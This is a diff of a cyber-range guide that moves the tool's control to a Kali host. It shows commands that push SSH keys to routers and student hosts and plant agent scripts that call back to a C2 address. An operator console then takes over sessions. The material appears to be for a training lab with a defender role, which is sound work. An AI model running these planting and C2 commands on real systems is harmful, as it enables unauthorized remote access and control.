@@ -141,9 +141,10 @@ put ./index.html /var/www/html/index.html
 
 ## Path, instead of proxychains
 
-SOCKS (`ssh -D`) plus proxychains adds a library to every process and cannot carry ICMP. Range writes an SSH config that uses ProxyJump and a master socket:
+SOCKS (`ssh -D`) plus proxychains adds a library to every process and cannot carry ICMP. The laptop only reaches ocelot, through one jump. Ocelot is Kali and has no internet, so copy the kit there. Hosts call ocelot’s public address, which changes. From ocelot the path is the WAN router, then the hosts. The SSH config has no jump in it.
 
 ```bash
+ssh -J cvte@10.50.11.232 ocelot@172.24.24.101
 python3 range.py route --hosts range-hosts.json --write range-ssh.conf
 ssh -F range-ssh.conf lab-wan
 python3 range.py keys --hosts range-hosts.json --ssh-config range-ssh.conf
@@ -152,13 +153,13 @@ python3 range.py fanout --hosts range-hosts.json --ssh-config range-ssh.conf --c
 python3 range.py watch --hosts range-hosts.json --ssh-config range-ssh.conf --student defender
 ```
 
-The first `ssh` takes the jump passwords. The master socket then stays up until you close it or the class is rebuilt. It does not expire. `keys` copies the public key on this account to every jump, both routers, and every host. Each one asks once. After that, this class does not ask again.
+Run `route`, `keys`, `ping`, `fanout`, and `watch` on ocelot. The first `ssh -F` takes the WAN password. The master socket then stays up until you close it or the class is rebuilt. `keys` copies ocelot’s public key to the WAN router, both LAN routers, and every host. Each one asks once.
 
-`plant` does that key copy, then uses `scp` to put the right script on every student host and starts it. Linux gets `range.py`. Windows gets `range-agent.ps1` for TCP, HTTP, and WebSocket, and `range.py` for the other channels. The agent id is the last octet of the address (`172.24.10.180` is `180`). Routers are logged in as `atropia_admin` and receive the key only. VYOS does not run an agent. The operator has to already be running on the attacker. On that console, `sessions`, then `use 180`.
+`plant` does that key copy, then uses `scp` to put the right script on every student host and starts it. Linux gets `range.py`. Windows gets `range-agent.ps1` for TCP, HTTP, and WebSocket, and `range.py` for the other channels. The agent id is the last octet of the address (`172.24.10.180` is `180`). `--c2` is ocelot’s public address, the one hosts can see, not `172.24.24.101`. Routers are logged in as `atropia_admin` and receive the key only. The operator has to already be running on ocelot. On that console, `sessions`, then `use 180`.
 
 ```bash
 python3 range.py plant --hosts range-hosts.json --ssh-config range-ssh.conf \
-  --c2 10.0.0.10 --channel ws --token 'lab-token-change-me' --profile continuous \
+  --c2 10.50.160.9 --channel ws --token 'lab-token-change-me' --profile continuous \
   --tcp-port 443 --http-port 80 --dns-port 53 --mqtt-port 1883 --ws-port 8070 --zone lab
 ```
 
